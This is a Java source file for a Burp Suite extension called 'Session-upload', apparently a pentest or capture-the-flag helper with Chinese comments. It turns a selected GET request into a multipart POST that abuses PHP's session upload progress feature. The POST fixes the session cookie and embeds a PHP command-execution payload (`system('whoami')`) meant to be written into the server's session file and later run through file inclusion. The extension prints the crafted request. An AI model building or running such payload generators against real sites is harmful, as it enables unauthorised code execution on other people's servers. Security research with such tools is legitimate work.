package burp;

import java.util.List;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.Arrays;
import javax.swing.JMenuItem;

public class BurpExtender implements IBurpExtender, IHttpListener,IContextMenuFactory{
    //所有burp插件都必须实现IBurpExtender接口，而且实现的类必须叫做BurpExtender
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private PrintWriter stderr;
    private String ExtenderName = "Session-upload";// 插件名称

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        //IBurpExtender必须实现的方法
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
//        callbacks.printOutput("success load Session-upload");
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        callbacks.setExtensionName(ExtenderName);
        callbacks.registerHttpListener(this);//如果没有注册，下面的processHttpMessage方法是不会生效的。处理请求和响应包的插件，这个应该是必要的
        callbacks.registerContextMenuFactory(this);
    }

    @Override
    public void processHttpMessage(int toolFlag,boolean messageIsRequest,IHttpRequestResponse messageInfo)
    {
    }

    private void modifyMessages(IHttpRequestResponse[] paramArrayOfIHttpRequestResponse, boolean paramBoolean)
    {

        for (IHttpRequestResponse localIHttpRequestResponse : paramArrayOfIHttpRequestResponse)
        {
            IRequestInfo localIRequestInfo = this.helpers.analyzeRequest(localIHttpRequestResponse);
            List headers = localIRequestInfo.getHeaders();
            headers.add("Cookie: PHPSESSID=Firebasky");
            headers.add("Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc4dhlXPNDKv5IFXO");
            headers.add("Content-Length:\n");
            headers.add("------WebKitFormBoundaryc4dhlXPNDKv5IFXO");
            headers.add("Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n");
            headers.add("111111111111111111111111111111111111111111111111111111111111111111111111111111<?php system('whoami');?>11111111111111111111111111111");
            headers.add("------WebKitFormBoundaryc4dhlXPNDKv5IFXO");
            headers.add("Content-Disposition: form-data; name=\"file\"; filename=\"a.txt\"\n");
            headers.add("--WebKitFormBoundaryc4dhlXPNDKv5IFXO--");
            for (Object header : headers) {
                if((String.valueOf(header)).substring(0,3).equals("GET")){
                    stdout.println((String.valueOf(header)).replace("GET","POST"));
                }else if((String.valueOf(header)).substring(0,6).equals("Cookie")){//有cookie
                    //存在一个小bug
                    String replace = (String.valueOf(header)).replace(String.valueOf(header), String.valueOf(header) + "; PHPSESSID=Firebasky");
                    if(replace.substring(8,17).equals("PHPSESSID")&&replace.substring(29,38).equals("PHPSESSID")){
                        stdout.println("Cookie: PHPSESSID=Firebasky");
                    }else if(replace.substring(8,17).equals("PHPSESSID")){
                        stdout.println(replace.replace(replace,"Cookie: PHPSESSID=Firebasky"));
                    }else {
                        stdout.println(replace);
                    }
                }else {
                    stdout.println(header);
                }
            }
//            byte[] byte_body = localIHttpRequestResponse.getRequest();//如果修改了header或者数修改了body，不能通过updateParameter，使用这个方法。
//            localIHttpRequestResponse.setRequest(helpers.buildHttpMessage(headers, byte_body));//设置最终新的请求包
        }
    }
    /****************按键**********************/
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation paramIContextMenuInvocation) {

        final IHttpRequestResponse[] arrayOfIHttpRequestResponse = paramIContextMenuInvocation.getSelectedMessages();
        if ((arrayOfIHttpRequestResponse == null) || (arrayOfIHttpRequestResponse.length == 0)) {
            return null;
        }
        JMenuItem localJMenuItem1 = new JMenuItem("Session-upload(only GET)");
        localJMenuItem1.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent paramAnonymousActionEvent)
            {
                BurpExtender.this.modifyMessages(arrayOfIHttpRequestResponse, false);
            }
        });
        return Arrays.asList(new JMenuItem[] { localJMenuItem1});
    }

}
